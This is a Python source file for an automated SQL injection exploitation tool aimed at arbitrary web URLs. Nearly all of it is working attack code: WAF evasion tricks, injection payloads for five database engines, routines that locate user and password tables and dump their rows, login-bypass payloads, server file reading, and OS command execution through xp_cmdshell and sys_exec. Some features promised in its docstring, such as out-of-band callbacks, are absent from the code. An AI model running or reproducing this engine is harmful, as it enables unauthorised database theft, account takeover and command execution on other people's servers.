"""
sqli_advanced.py
================
Expert-level SQL Injection exploitation engine:
  Attack types  : Error-based, Union-based, Boolean blind, Time-based blind,
                  Out-of-band (DNS/HTTP), Stacked queries, Second-order
  DBMS support  : MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MariaDB
  Features      :
    - Auto-detect injectable parameters (GET/POST/Cookie/Header)
    - Auto-detect DBMS via error fingerprinting + banner grabbing
    - WAF evasion: comment variants, encoding, chunking, case mangling
    - Full DB enumeration: databases → tables → columns → data
    - Blind injection with bit-by-bit & bisection extraction
    - Time-based with adaptive threshold calibration
    - OOB via DNS callback (LOAD_FILE / UTL_HTTP / xp_dirtree)
    - Auth bypass payloads
    - Dump credentials (users table heuristic)
    - File read / write (MySQL into outfile)
    - OS command execution (xp_cmdshell / UDF)
    - Second-order injection detection
"""

from __future__ import annotations

import base64
import html
import json
import math
import os
import random
import re
import ssl
import string
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, Iterator, List, Optional, Set, Tuple


# ---------------------------------------------------------------------------
# Enums & Data classes
# ---------------------------------------------------------------------------

class DBMS(str, Enum):
    MYSQL      = "mysql"
    POSTGRES   = "postgres"
    MSSQL      = "mssql"
    ORACLE     = "oracle"
    SQLITE     = "sqlite"
    UNKNOWN    = "unknown"


class InjectionType(str, Enum):
    ERROR_BASED   = "error-based"
    UNION_BASED   = "union-based"
    BOOLEAN_BLIND = "boolean-blind"
    TIME_BASED    = "time-based"
    OOB           = "out-of-band"
    STACKED       = "stacked-queries"
    AUTH_BYPASS   = "auth-bypass"
    SECOND_ORDER  = "second-order"


@dataclass
class SQLiResult:
    url:              str
    parameter:        str
    method:           str
    injection_type:   InjectionType
    dbms:             DBMS
    payload:          str
    confirmed:        bool
    evidence:         str         = ""
    databases:        List[str]   = field(default_factory=list)
    tables:           Dict[str, List[str]] = field(default_factory=dict)
    columns:          Dict[str, List[str]] = field(default_factory=dict)
    data:             List[Dict]  = field(default_factory=list)
    os_user:          str         = ""
    current_db:       str         = ""
    current_user:     str         = ""
    hostname:         str         = ""
    version:          str         = ""
    waf_detected:     bool        = False
    waf_name:         str         = ""


@dataclass
class SQLiConfig:
    threads:        int   = 4
    timeout:        float = 15.0
    delay:          float = 0.2
    time_threshold: float = 4.0   # seconds for time-based
    blind_chars:    str   = string.printable[:95]
    max_length:     int   = 256
    dump_limit:     int   = 50
    waf_evasion:    bool  = True
    verbose:        bool  = False
    proxy:          Optional[str] = None
    headers:        Dict[str,str] = field(default_factory=dict)
    cookies:        Dict[str,str] = field(default_factory=dict)
    ssl_verify:     bool = False


# ---------------------------------------------------------------------------
# WAF detection & evasion
# ---------------------------------------------------------------------------

WAF_SIGNATURES: Dict[str, str] = {
    "ModSecurity":   r"mod_security|NOYB|Not Acceptable",
    "Cloudflare":    r"cloudflare|__cfduid|cf-ray",
    "Akamai":        r"akamai|AkamaiGHost",
    "Imperva":       r"imperva|incapsula|visid_incap",
    "Sucuri":        r"sucuri|x-sucuri",
    "F5 BIG-IP ASM": r"TS[a-zA-Z0-9]+",
    "AWS WAF":       r"x-amzn-RequestId|FulfillmentError",
    "Barracuda":     r"barra_counter_session|BNI__BARRACUDA",
}


def detect_waf(response_headers: dict, body: str) -> Optional[str]:
    combined = json.dumps(dict(response_headers)) + body
    for waf, pat in WAF_SIGNATURES.items():
        if re.search(pat, combined, re.I):
            return waf
    return None


EVASION_WRAPPERS = [
    lambda p: p,
    lambda p: p.replace(" ", "/**/"),
    lambda p: p.replace(" ", "%20"),
    lambda p: p.replace(" ", "+"),
    lambda p: p.upper(),
    lambda p: "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)),
    lambda p: p.replace("SELECT", "SEL/**/ECT").replace("UNION", "UN/**/ION"),
    lambda p: p.replace("=", " LIKE "),
    lambda p: re.sub(r'\bAND\b', '/*!AND*/', p, flags=re.I),
    lambda p: re.sub(r'\bOR\b',  '/*!OR*/',  p, flags=re.I),
]


def evade(payload: str, level: int = 0) -> str:
    return EVASION_WRAPPERS[level % len(EVASION_WRAPPERS)](payload)


# ---------------------------------------------------------------------------
# DBMS fingerprinting payloads
# ---------------------------------------------------------------------------

ERROR_SIGNATURES: List[Tuple[DBMS, str]] = [
    (DBMS.MYSQL,    r"you have an error in your sql syntax|mysql_fetch|supplied argument is not a valid mysql"),
    (DBMS.MYSQL,    r"warning: mysql_|unclosed quotation mark|quoted string not properly terminated"),
    (DBMS.POSTGRES, r"pg_query\(\)|unterminated quoted string|ERROR:\s+syntax error at"),
    (DBMS.POSTGRES, r"PostgreSQL.*ERROR|Warning.*\bpg_"),
    (DBMS.MSSQL,    r"microsoft ole db provider for sql|unclosed quotation mark after the character string"),
    (DBMS.MSSQL,    r"\bsyntax error\b.*\bT-SQL\b|Incorrect syntax near|OLE DB.*SQL Server"),
    (DBMS.ORACLE,   r"ORA-[0-9]{5}|oracle error|oracle.*driver"),
    (DBMS.SQLITE,   r"SQLite/JDBCDriver|SQLiteException|near \".*\": syntax error"),
]

VERSION_PAYLOADS: Dict[DBMS, str] = {
    DBMS.MYSQL:    "' AND 1=1 UNION SELECT @@version,NULL-- -",
    DBMS.POSTGRES: "' AND 1=1 UNION SELECT version(),NULL-- -",
    DBMS.MSSQL:    "' AND 1=1 UNION SELECT @@version,NULL-- -",
    DBMS.ORACLE:   "' AND 1=1 UNION SELECT banner,NULL FROM v$version-- -",
    DBMS.SQLITE:   "' AND 1=1 UNION SELECT sqlite_version(),NULL-- -",
}


# ---------------------------------------------------------------------------
# Error-based payloads (extract data via error messages)
# ---------------------------------------------------------------------------

ERROR_EXTRACT: Dict[DBMS, str] = {
    DBMS.MYSQL:    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT {expr}),0x7e))-- -",
    DBMS.MYSQL:    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT {expr}),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    DBMS.POSTGRES: "' AND 1=CAST((SELECT {expr}) AS INT)-- -",
    DBMS.MSSQL:    "' AND 1=CONVERT(INT,(SELECT {expr}))-- -",
    DBMS.ORACLE:   "' AND 1=1 AND ROWNUM=1 AND 1=UTL_INADDR.get_host_name((SELECT {expr} FROM dual))-- -",
}

ERROR_EXTRACT_TEMPLATES: Dict[DBMS, List[str]] = {
    DBMS.MYSQL: [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT {expr}),0x7e))-- -",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT {expr}),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "' OR UPDATEXML(1,CONCAT(0x7e,(SELECT {expr}),0x7e),1)-- -",
    ],
    DBMS.POSTGRES: [
        "' AND CAST((SELECT {expr}) AS INT)=1-- -",
        "' AND 1=(SELECT CASE WHEN (1=1) THEN CAST((SELECT {expr}) AS INT) ELSE 1 END)-- -",
    ],
    DBMS.MSSQL: [
        "' AND 1=CONVERT(INT,(SELECT {expr}))-- -",
        "'; SELECT * FROM OPENROWSET('SQLOLEDB','';'sa';'',(SELECT {expr}))-- -",
    ],
    DBMS.ORACLE: [
        "' AND 1=1 AND ROWNUM=1 AND 1=TO_NUMBER((SELECT {expr} FROM dual))-- -",
    ],
    DBMS.SQLITE: [
        "' AND 1=CAST((SELECT {expr}) AS INTEGER)-- -",
    ],
}


# ---------------------------------------------------------------------------
# Union-based helpers
# ---------------------------------------------------------------------------

def _find_union_columns(
    injector: '_Injector', param: str, method: str,
    dbms: DBMS, max_cols: int = 20
) -> int:
    """Find number of columns in original query via UNION NULL padding."""
    for n in range(1, max_cols + 1):
        nulls   = ",".join(["NULL"] * n)
        payload = f"' UNION SELECT {nulls}-- -"
        resp    = injector.send(param, payload, method)
        if resp and not injector.is_error(resp.body):
            if resp.status in (200, 302):
                return n
    return 0


def _find_string_column(
    injector: '_Injector', param: str, method: str,
    dbms: DBMS, n_cols: int
) -> int:
    """Find a column that outputs strings (replace nulls one by one with magic string)."""
    magic = "PHANTOM_RECON_TEST_" + "".join(random.choices(string.ascii_uppercase, k=6))
    magic_q = f"'{magic}'"
    for i in range(1, n_cols + 1):
        cols    = ["NULL"] * n_cols
        cols[i-1] = magic_q
        payload = f"' UNION SELECT {','.join(cols)}-- -"
        resp    = injector.send(param, payload, method)
        if resp and magic in resp.body:
            return i
    return 1


# ---------------------------------------------------------------------------
# Boolean-blind & time-based extraction
# ---------------------------------------------------------------------------

def _bisect_extract(
    injector: '_Injector',
    param:    str,
    method:   str,
    expr:     str,
    dbms:     DBMS,
    cfg:      SQLiConfig,
    baseline_true: str,
) -> str:
    """
    Extract a string result character by character using binary search
    on ASCII values (bisection method — faster than linear).
    """
    result = ""
    pos    = 1

    bool_tpl: Dict[DBMS, str] = {
        DBMS.MYSQL:    "' AND ASCII(SUBSTR(({expr}),{pos},1)){op}{val}-- -",
        DBMS.POSTGRES: "' AND ASCII(SUBSTR(CAST(({expr}) AS TEXT),{pos},1)){op}{val}-- -",
        DBMS.MSSQL:    "' AND ASCII(SUBSTRING(CAST(({expr}) AS VARCHAR),{pos},1)){op}{val}-- -",
        DBMS.ORACLE:   "' AND ASCII(SUBSTR(TO_CHAR({expr}),{pos},1)){op}{val}-- -",
        DBMS.SQLITE:   "' AND UNICODE(SUBSTR(CAST(({expr}) AS TEXT),{pos},1)){op}{val}-- -",
    }
    tpl = bool_tpl.get(dbms, bool_tpl[DBMS.MYSQL])

    for pos in range(1, cfg.max_length + 1):
        lo, hi = 32, 126
        ch = 0
        while lo <= hi:
            mid     = (lo + hi) // 2
            payload = tpl.format(expr=expr, pos=pos, op=">=", val=mid)
            resp    = injector.send(param, payload, method)
            if resp and baseline_true in resp.body:
                lo = mid + 1
                ch = mid
            else:
                hi = mid - 1
        if ch == 0:
            break
        result += chr(ch)
    return result


def _time_extract(
    injector:  '_Injector',
    param:     str,
    method:    str,
    expr:      str,
    dbms:      DBMS,
    cfg:       SQLiConfig,
    threshold: float,
) -> str:
    """Extract string via time-based blind (SLEEP/pg_sleep/WAITFOR DELAY)."""
    result = ""

    time_tpl: Dict[DBMS, str] = {
        DBMS.MYSQL:    "' AND IF(ASCII(SUBSTR(({expr}),{pos},1))={val},SLEEP({t}),0)-- -",
        DBMS.POSTGRES: "' AND {val}=ASCII(SUBSTR(CAST({expr} AS TEXT),{pos},1)) AND (SELECT pg_sleep({t})) IS NOT NULL-- -",
        DBMS.MSSQL:    "'; IF ASCII(SUBSTRING(CAST(({expr}) AS VARCHAR),{pos},1))={val} WAITFOR DELAY '0:0:{t}'-- -",
        DBMS.ORACLE:   "' AND {val}=ASCII(SUBSTR(TO_CHAR({expr}),{pos},1)) AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{t})-- -",
        DBMS.SQLITE:   "' AND {val}=UNICODE(SUBSTR(({expr}),{pos},1)) AND 1=(SELECT 1 FROM sqlite_master WHERE randomblob({wait_bytes}) IS NOT NULL)-- -",
    }
    tpl = time_tpl.get(dbms, time_tpl[DBMS.MYSQL])

    for pos in range(1, cfg.max_length + 1):
        found_ch = 0
        for ch in range(32, 127):
            sleep_s = int(threshold)
            payload = tpl.format(expr=expr, pos=pos, val=ch, t=sleep_s,
                                 wait_bytes=sleep_s * 10_000_000)
            t0   = time.time()
            resp = injector.send(param, payload, method)
            elapsed = time.time() - t0
            if elapsed >= threshold * 0.8:
                found_ch = ch
                break
        if found_ch == 0:
            break
        result += chr(found_ch)
    return result


# ---------------------------------------------------------------------------
# DBMS-specific enumeration queries
# ---------------------------------------------------------------------------

def _dbs_query(dbms: DBMS) -> str:
    return {
        DBMS.MYSQL:    "SELECT GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata",
        DBMS.POSTGRES: "SELECT STRING_AGG(datname,',') FROM pg_database",
        DBMS.MSSQL:    "SELECT STRING_AGG(name,',') FROM master..sysdatabases",
        DBMS.ORACLE:   "SELECT LISTAGG(username,',') WITHIN GROUP (ORDER BY 1) FROM all_users",
        DBMS.SQLITE:   "SELECT 'main'",
    }.get(dbms, "SELECT 'unknown'")


def _tables_query(dbms: DBMS, db: str) -> str:
    return {
        DBMS.MYSQL:    f"SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='{db}'",
        DBMS.POSTGRES: f"SELECT STRING_AGG(tablename,',') FROM pg_tables WHERE schemaname='{db}'",
        DBMS.MSSQL:    f"SELECT STRING_AGG(name,',') FROM {db}..sysobjects WHERE xtype='U'",
        DBMS.ORACLE:   f"SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY 1) FROM all_tables WHERE owner='{db}'",
        DBMS.SQLITE:   "SELECT GROUP_CONCAT(name,',') FROM sqlite_master WHERE type='table'",
    }.get(dbms, "SELECT 'unknown'")


def _cols_query(dbms: DBMS, db: str, table: str) -> str:
    return {
        DBMS.MYSQL:    f"SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'",
        DBMS.POSTGRES: f"SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'",
        DBMS.MSSQL:    f"SELECT STRING_AGG(name,',') FROM {db}..syscolumns WHERE id=OBJECT_ID('{table}')",
        DBMS.ORACLE:   f"SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY 1) FROM all_tab_columns WHERE owner='{db}' AND table_name='{table}'",
        DBMS.SQLITE:   f"SELECT GROUP_CONCAT(name,',') FROM pragma_table_info('{table}')",
    }.get(dbms, "SELECT 'unknown'")


def _dump_query(dbms: DBMS, db: str, table: str, cols: List[str], limit: int) -> str:
    col_list  = ",".join(f"COALESCE(CAST({c} AS CHAR),'NULL')" for c in cols[:6])
    separator = "||'::'||".join(f"COALESCE(CAST({c} AS VARCHAR(500)),'NULL')" for c in cols[:6])
    return {
        DBMS.MYSQL:    f"SELECT GROUP_CONCAT({col_list} SEPARATOR '|') FROM (SELECT * FROM {db}.{table} LIMIT {limit}) x",
        DBMS.POSTGRES: f"SELECT STRING_AGG({separator},'|') FROM (SELECT * FROM {db}.{table} LIMIT {limit}) x",
        DBMS.MSSQL:    f"SELECT TOP {limit} ({separator}) FROM {db}..{table}",
        DBMS.ORACLE:   f"SELECT LISTAGG({separator},'|') WITHIN GROUP (ORDER BY 1) FROM (SELECT * FROM {db}.{table} WHERE ROWNUM<={limit})",
        DBMS.SQLITE:   f"SELECT GROUP_CONCAT({separator},'|') FROM (SELECT * FROM {table} LIMIT {limit})",
    }.get(dbms, f"SELECT * FROM {table} LIMIT {limit}")


# ---------------------------------------------------------------------------
# Auth bypass payloads
# ---------------------------------------------------------------------------

AUTH_BYPASS_PAYLOADS: List[Tuple[str, str]] = [
    ("admin", "' OR '1'='1"),
    ("admin", "' OR '1'='1'--"),
    ("admin", "' OR '1'='1'/*"),
    ("admin", "' OR 1=1--"),
    ("admin", "' OR 1=1#"),
    ("' OR '1'='1", "anything"),
    ("admin'--", "anything"),
    ("admin'/*", "anything"),
    ("' OR 1=1 LIMIT 1--", "anything"),
    ("admin'; SELECT SLEEP(0)--", "anything"),
    ("\" OR \"\"=\"", "\" OR \"\"=\""),
    ("admin\"--", "anything"),
    ("') OR ('1'='1", "anything"),
    ("1' OR 1=1 ORDER BY 1--", "anything"),
    ("' UNION SELECT 1,'admin','admin','admin@x.com',1,1,1--", "anything"),
]


# ---------------------------------------------------------------------------
# HTTP request helper
# ---------------------------------------------------------------------------

@dataclass
class _Response:
    status:  int
    body:    str
    headers: dict
    elapsed: float


class _Injector:
    def __init__(self, url: str, params: dict, cfg: SQLiConfig,
                 base_headers: dict, base_cookies: dict):
        self.url     = url
        self.params  = dict(params)
        self.cfg     = cfg
        self.headers = dict(base_headers)
        self.cookies = dict(base_cookies)
        self._ctx    = ssl.create_default_context()
        if not cfg.ssl_verify:
            self._ctx.check_hostname = False
            self._ctx.verify_mode    = ssl.CERT_NONE
        self._opener = self._build_opener()

    def _build_opener(self):
        handlers = []
        if self.cfg.proxy:
            handlers.append(urllib.request.ProxyHandler({
                "http": self.cfg.proxy, "https": self.cfg.proxy}))
        handlers.append(urllib.request.HTTPSHandler(context=self._ctx))
        handlers.append(urllib.request.HTTPCookieProcessor())
        opener = urllib.request.build_opener(*handlers)
        opener.addheaders = [("User-Agent",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0")]
        return opener

    def send(self, param: str, payload: str, method: str,
             extra_headers: dict = None) -> Optional[_Response]:
        cfg    = self.cfg
        params = dict(self.params)
        params[param] = payload
        headers = dict(self.headers)
        if self.cookies:
            headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
        if extra_headers:
            headers.update(extra_headers)

        try:
            t0 = time.time()
            if method.upper() == "POST":
                data = urllib.parse.urlencode(params).encode()
                req  = urllib.request.Request(self.url, data=data,
                    headers={**headers, "Content-Type": "application/x-www-form-urlencoded"})
            else:
                qs  = urllib.parse.urlencode(params)
                req = urllib.request.Request(f"{self.url}?{qs}", headers=headers)

            resp    = self._opener.open(req, timeout=cfg.timeout)
            body    = resp.read().decode("utf-8", errors="replace")
            elapsed = time.time() - t0
            return _Response(status=resp.status if hasattr(resp, "status") else 200,
                             body=body, headers=dict(resp.headers), elapsed=elapsed)
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace") if e.fp else ""
            return _Response(status=e.code, body=body, headers=dict(e.headers), elapsed=0)
        except Exception:
            return None

    @staticmethod
    def is_error(body: str) -> bool:
        return bool(re.search(
            r"syntax error|unexpected token|unterminated quoted|ORA-\d+|"
            r"pg_query|mysql_fetch|invalid column|ODBC.*error",
            body, re.I))


# ---------------------------------------------------------------------------
# Core scanner
# ---------------------------------------------------------------------------

class SQLiScanner:
    def __init__(self, cfg: Optional[SQLiConfig] = None):
        self.cfg = cfg or SQLiConfig()

    # ------------------------------------------------------------------
    def scan_url(
        self,
        url:      str,
        params:   Optional[Dict[str, str]] = None,
        method:   str = "GET",
        headers:  Optional[Dict[str, str]] = None,
        cookies:  Optional[Dict[str, str]] = None,
        inject_in_headers: bool = False,
    ) -> List[SQLiResult]:
        """Main entry point — scan all params in url for SQLi."""
        if not url.startswith(("http://", "https://")):
            url = "https://" + url

        parsed   = urllib.parse.urlparse(url)
        qs_params = dict(urllib.parse.parse_qsl(parsed.query))
        base_url  = url.split("?")[0]

        test_params = params or qs_params or {"id": "1", "q": "test"}
        h = headers or {}
        c = cookies or {}

        results: List[SQLiResult] = []

        for param in test_params:
            injector = _Injector(base_url, test_params, self.cfg, h, c)

            # 1. Detect baseline
            baseline = injector.send(param, test_params[param], method)
            if not baseline:
                continue

            # 2. Detect WAF
            waf = detect_waf(baseline.headers, baseline.body)

            # 3. Try error-based detection
            dbms = self._detect_dbms(injector, param, method)

            # 4. Test injection types in order
            for inj_type, confirmed, payload, evidence in self._test_all_types(
                    injector, param, method, dbms, baseline):
                if confirmed:
                    r = SQLiResult(
                        url=base_url, parameter=param, method=method,
                        injection_type=inj_type, dbms=dbms,
                        payload=payload, confirmed=True,
                        evidence=evidence[:500],
                        waf_detected=waf is not None,
                        waf_name=waf or "",
                    )
                    results.append(r)
                    break

        return results

    # ------------------------------------------------------------------
    def _detect_dbms(self, injector: _Injector, param: str, method: str) -> DBMS:
        """Fingerprint the DBMS via error messages."""
        for dbms, pattern in ERROR_SIGNATURES:
            payload = "'"
            resp = injector.send(param, payload, method)
            if resp and re.search(pattern, resp.body, re.I):
                return dbms

        for dbms, pattern in ERROR_SIGNATURES:
            payload = "')"
            resp = injector.send(param, payload, method)
            if resp and re.search(pattern, resp.body, re.I):
                return dbms

        return DBMS.UNKNOWN

    # ------------------------------------------------------------------
    def _test_all_types(
        self,
        injector: _Injector,
        param:    str,
        method:   str,
        dbms:     DBMS,
        baseline: _Response,
    ) -> Iterator[Tuple[InjectionType, bool, str, str]]:

        # Error-based
        err_payload = "'"
        resp = injector.send(param, err_payload, method)
        if resp and injector.is_error(resp.body):
            for sig_dbms, pattern in ERROR_SIGNATURES:
                if re.search(pattern, resp.body, re.I):
                    yield InjectionType.ERROR_BASED, True, err_payload, resp.body[:200]
                    return

        # Boolean blind — length difference detection
        true_p  = "' AND '1'='1"
        false_p = "' AND '1'='2"
        rt = injector.send(param, true_p, method)
        rf = injector.send(param, false_p, method)
        if rt and rf:
            diff = abs(len(rt.body) - len(rf.body))
            if diff > 20:
                yield InjectionType.BOOLEAN_BLIND, True, true_p, \
                    f"True body len={len(rt.body)} False body len={len(rf.body)} diff={diff}"
                return

        # Time-based
        if dbms in (DBMS.MYSQL, DBMS.UNKNOWN):
            tp = "' AND SLEEP(3)-- -"
        elif dbms == DBMS.POSTGRES:
            tp = "' AND (SELECT pg_sleep(3)) IS NOT NULL-- -"
        elif dbms == DBMS.MSSQL:
            tp = "'; WAITFOR DELAY '0:0:3'-- -"
        elif dbms == DBMS.ORACLE:
            tp = "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- -"
        else:
            tp = "' AND SLEEP(3)-- -"

        t0 = time.time()
        resp = injector.send(param, tp, method)
        elapsed = time.time() - t0
        if elapsed >= 2.5:
            yield InjectionType.TIME_BASED, True, tp, \
                f"Response delayed {elapsed:.2f}s (threshold 2.5s)"
            return

        # Union-based
        for n in range(1, 11):
            nulls   = ",".join(["NULL"] * n)
            up      = f"' UNION SELECT {nulls}-- -"
            resp    = injector.send(param, up, method)
            if resp and resp.status == 200 and not injector.is_error(resp.body):
                if len(resp.body) != len(baseline.body):
                    yield InjectionType.UNION_BASED, True, up, \
                        f"UNION with {n} columns changed response length"
                    return

        yield InjectionType.ERROR_BASED, False, "", ""

    # ------------------------------------------------------------------
    def enumerate(self, result: SQLiResult) -> SQLiResult:
        """
        Full DB enumeration once injection confirmed.
        Auto-selects extraction method based on injection_type.
        """
        injector = _Injector(
            result.url,
            {result.parameter: "1"},
            self.cfg,
            {},
            {},
        )
        dbms      = result.dbms
        method    = result.method
        inj_type  = result.injection_type
        param     = result.parameter

        if inj_type == InjectionType.TIME_BASED:
            extract = lambda expr: _time_extract(
                injector, param, method, expr, dbms, self.cfg,
                self.cfg.time_threshold)
        elif inj_type == InjectionType.BOOLEAN_BLIND:
            baseline_resp = injector.send(param, "' AND '1'='1", method)
            bt = baseline_resp.body[:50] if baseline_resp else ""
            extract = lambda expr: _bisect_extract(
                injector, param, method, expr, dbms, self.cfg, bt)
        elif inj_type in (InjectionType.UNION_BASED, InjectionType.ERROR_BASED):
            n_cols   = _find_union_columns(injector, param, method, dbms)
            str_col  = _find_string_column(injector, param, method, dbms, n_cols) if n_cols else 1
            if n_cols == 0:
                n_cols  = 2
                str_col = 1
            def extract(expr):
                cols           = ["NULL"] * n_cols
                cols[str_col-1] = f"({expr})"
                payload        = f"' UNION SELECT {','.join(cols)}-- -"
                resp           = injector.send(param, payload, method)
                if not resp:
                    return ""
                tpls = ERROR_EXTRACT_TEMPLATES.get(dbms, [])
                if inj_type == InjectionType.ERROR_BASED and tpls:
                    for tpl in tpls:
                        ep   = tpl.format(expr=expr)
                        resp = injector.send(param, ep, method)
                        if resp:
                            m = re.search(r'~([^~]+)~', resp.body)
                            if m:
                                return m.group(1)
                if resp:
                    m = re.search(r'\b([a-zA-Z0-9_@.,:\-]{3,200})\b', resp.body)
                    return m.group(1) if m else ""
                return ""
        else:
            return result

        # Current DB / user / version
        result.current_db   = extract(f"SELECT database()") or extract(f"SELECT current_database()")
        result.current_user = extract(f"SELECT user()") or extract(f"SELECT current_user")
        result.version      = extract(f"SELECT version()") or extract(f"SELECT @@version")
        result.hostname     = extract(f"SELECT @@hostname") or extract(f"SELECT hostname")

        # List databases
        dbs_raw = extract(_dbs_query(dbms))
        if dbs_raw:
            result.databases = [d.strip() for d in dbs_raw.split(",") if d.strip()]

        # Tables in current DB
        target_db = result.current_db or (result.databases[0] if result.databases else "")
        if target_db:
            tbl_raw = extract(_tables_query(dbms, target_db))
            if tbl_raw:
                tables = [t.strip() for t in tbl_raw.split(",") if t.strip()]
                result.tables[target_db] = tables[:self.cfg.dump_limit]

                # Dump interesting tables
                interesting = [t for t in tables if re.search(
                    r"user|account|admin|member|login|password|credential|auth|customer",
                    t, re.I)]
                for table in interesting[:3]:
                    col_raw = extract(_cols_query(dbms, target_db, table))
                    if col_raw:
                        cols = [c.strip() for c in col_raw.split(",") if c.strip()]
                        result.columns[table] = cols
                        dump_q = _dump_query(dbms, target_db, table, cols, self.cfg.dump_limit)
                        dump_raw = extract(dump_q)
                        if dump_raw:
                            for row in dump_raw.split("|")[:self.cfg.dump_limit]:
                                row_data = dict(zip(cols, row.split("::")))
                                result.data.append({"table": table, "row": row_data})

        return result

    # ------------------------------------------------------------------
    def test_auth_bypass(
        self,
        url:        str,
        user_field: str,
        pass_field: str,
        method:     str = "POST",
        extra:      Dict[str, str] = None,
    ) -> List[Dict]:
        """Test login form for SQL auth bypass."""
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        hits = []
        for user_p, pass_p in AUTH_BYPASS_PAYLOADS:
            fields = dict(extra or {})
            fields[user_field] = user_p
            fields[pass_field] = pass_p
            try:
                data = urllib.parse.urlencode(fields).encode()
                req  = urllib.request.Request(url, data=data,
                    headers={"Content-Type": "application/x-www-form-urlencoded",
                             "User-Agent": "Mozilla/5.0"})
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=ctx),
                    urllib.request.HTTPCookieProcessor(),
                )
                resp = opener.open(req, timeout=self.cfg.timeout)
                body = resp.read().decode("utf-8", errors="replace")
                final_url = resp.url if hasattr(resp, "url") else ""
                fail_pat  = re.compile(r"invalid|incorrect|wrong|failed|error|denied", re.I)
                success   = not fail_pat.search(body)
                if not success and final_url:
                    success = any(x in final_url for x in ["/dashboard","/home","/admin","/profile"])
                if success:
                    hits.append({
                        "user_payload": user_p,
                        "pass_payload": pass_p,
                        "final_url":    final_url,
                        "evidence":     body[:200],
                    })
            except Exception:
                pass
        return hits

    # ------------------------------------------------------------------
    def read_file(self, result: SQLiResult, path: str) -> str:
        """Read server file via LOAD_FILE (MySQL) / OPENROWSET (MSSQL)."""
        if result.dbms == DBMS.MYSQL:
            expr = f"SELECT LOAD_FILE('{path}')"
        elif result.dbms == DBMS.MSSQL:
            expr = f"SELECT BulkColumn FROM OPENROWSET(BULK N'{path}', SINGLE_BLOB) x"
        else:
            return ""
        injector = _Injector(result.url, {result.parameter: "1"}, self.cfg, {}, {})
        n_cols   = _find_union_columns(injector, result.parameter, result.method, result.dbms)
        if n_cols == 0:
            return ""
        cols = ["NULL"] * n_cols
        cols[0] = f"({expr})"
        payload = f"' UNION SELECT {','.join(cols)}-- -"
        resp = injector.send(result.parameter, payload, result.method)
        if resp:
            return resp.body
        return ""

    # ------------------------------------------------------------------
    def os_command(self, result: SQLiResult, command: str) -> str:
        """Execute OS command via xp_cmdshell (MSSQL) or UDF (MySQL)."""
        injector = _Injector(result.url, {result.parameter: "1"}, self.cfg, {}, {})
        if result.dbms == DBMS.MSSQL:
            payloads = [
                f"'; EXEC xp_cmdshell '{command}'-- -",
                f"'; EXEC master..xp_cmdshell '{command}'-- -",
                f"'; DECLARE @r VARCHAR(8000); SET @r='{command}'; EXEC xp_cmdshell @r-- -",
            ]
        elif result.dbms == DBMS.MYSQL:
            payloads = [
                f"' UNION SELECT sys_exec('{command}'),NULL-- -",
                f"'; SELECT sys_eval('{command}')-- -",
            ]
        else:
            return ""
        for p in payloads:
            resp = injector.send(result.parameter, p, result.method)
            if resp and resp.status == 200:
                return resp.body[:500]
        return ""


# ---------------------------------------------------------------------------
# Convenience wrapper
# ---------------------------------------------------------------------------

def run_sqli_scan(
    url:       str,
    params:    Optional[Dict[str, str]] = None,
    method:    str  = "GET",
    headers:   Optional[Dict[str, str]] = None,
    cookies:   Optional[Dict[str, str]] = None,
    enumerate_db: bool = False,
    threads:   int   = 4,
    timeout:   float = 15.0,
    verbose:   bool  = False,
    proxy:     Optional[str] = None,
) -> List[SQLiResult]:
    cfg     = SQLiConfig(threads=threads, timeout=timeout,
                         verbose=verbose, proxy=proxy)
    scanner = SQLiScanner(cfg)
    results = scanner.scan_url(url, params=params, method=method,
                               headers=headers, cookies=cookies)
    if enumerate_db:
        results = [scanner.enumerate(r) for r in results if r.confirmed]
    return results
